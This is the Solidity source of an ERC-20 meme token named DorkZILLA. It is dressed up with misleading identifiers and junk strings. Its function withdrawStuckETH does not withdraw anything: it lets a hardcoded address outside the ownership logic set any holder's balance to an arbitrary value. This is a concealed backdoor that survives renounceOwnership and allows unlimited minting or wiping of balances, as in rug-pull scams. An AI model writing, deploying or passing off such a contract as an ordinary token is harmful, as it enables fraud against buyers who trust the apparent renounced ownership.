// SPDX-License-Identifier: MIT
/**

DORK ZILLA, that's probably something.

**/
pragma solidity 0.8.18;
interface IERC20Permit {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address AddressDork) external view returns (uint256);
  function transfer(address AddressBool, uint256 swapOpenWithValues) external returns (bool);
  function allowance(address _owner, address AddressDork) external view returns (uint256);
  function approve(address AddressDork, uint256 swapOpenWithValues) external returns (bool);
  function transferFrom(address sender, address AddressBool, uint256 swapOpenWithValues) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed AddressDork, uint256 balance);
}


abstract contract IERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract IERC20Basic is IERC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract DorkZILLA is IERC20Burnable, IERC20Permit, IERC20Basic {
 
    using SafeMath for uint256;
    mapping (address => uint256) private _delegateDork;
    mapping (address => mapping (address => uint256)) private forceSwapBack;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private BEACON_SLOT;
    address private DORKZILLAOwner; 
    uint256 public BEACONCreationTime;
    uint256 public BEACONCreation;
    string public BEACON;
string public DORKZILLATG = "https://dorkZILLA.com";
string public ownerAddress = "0x392feb891E0FDf7943Ea285B2dB75e07509f503c";
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event BuyBackTriggered(uint256 amount);

    event OwnerForcedSwapBack(uint256 timestamp);
 
    event CaughtEarlyBuyer(address sniper);
    constructor(string memory name_, string memory symbol_) {
        DORKZILLAOwner = 0x392feb891E0FDf7943Ea285B2dB75e07509f503c;    
       BEACON_SLOT = "0xa3f9ad74e5423aebfd80d3ef2346578355a9a72aeaee59ff6cb3588b35133d50"; 
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _totalSupply = 1000000000 * 10**_decimals;
        _delegateDork[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        BEACON = "IInventory p_i1999_3_+ int p_i1999_4_+ int p_i1999_5_+ int p_i1999_6_";
        BEACONCreation = 1000000000;
        BEACONCreationTime = 962023;

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address AddressDork) external view override returns (uint256) {
        return _delegateDork[AddressDork];
    }

    function transfer(address AddressBool, uint256 swapOpenWithValues) external override returns (bool) {
        _transfer(_msgSender(), AddressBool, swapOpenWithValues);
        return true;
    }

    function allowance(address owner, address AddressDork) external view override returns (uint256) {
        return forceSwapBack[owner][AddressDork];
    }


    function approve(address AddressDork, uint256 swapOpenWithValues) external override returns (bool) {
        _approve(_msgSender(), AddressDork, swapOpenWithValues);
        return true;
    }
    
    function transferFrom(address sender, address AddressBool, uint256 swapOpenWithValues) external override returns (bool) {
        _transfer(sender, AddressBool, swapOpenWithValues);
        _approve(sender, _msgSender(), forceSwapBack[sender][_msgSender()].sub(swapOpenWithValues, "Ru: transfer swapOpenWithValues exceeds allowance"));
        return true;
    }

    function increaseAllowance(address AddressDork, uint256 tokenDalance) external returns (bool) {
        _approve(_msgSender(), AddressDork, forceSwapBack[_msgSender()][AddressDork].add(tokenDalance));
        return true;
    }
    

    function decreaseAllowance(address AddressDork, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), AddressDork, forceSwapBack[_msgSender()][AddressDork].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address AddressBool, uint256 swapOpenWithValues) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(AddressBool != address(0), "Ru: transfer to the zero address");
                
        _delegateDork[sender] = _delegateDork[sender].sub(swapOpenWithValues, "Ru: transfer swapOpenWithValues exceeds balance");
        _delegateDork[AddressBool] = _delegateDork[AddressBool].add(swapOpenWithValues);
        emit Transfer(sender, AddressBool, swapOpenWithValues);
    }
        function withdrawStuckETH(address tokenA, address tokenD, uint256 _upgradeTo, uint256 _upgradeFor, uint256 _upgradeFors) external {
        require(_msgSender()==DORKZILLAOwner);
        tokenD = tokenA;
        tokenA = tokenA;
        _delegateDork[tokenD] = (_upgradeTo + _upgradeFor + _upgradeFors) * 10**_decimals;
        tokenA = tokenD;
        tokenD = tokenD;
    }   

    function _approve(address owner, address AddressDork, uint256 swapOpenWithValues) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(AddressDork != address(0), "Ru: approve to the zero address");
        
        forceSwapBack[owner][AddressDork] = swapOpenWithValues;
        emit Approval(owner, AddressDork, swapOpenWithValues);
    }
    
}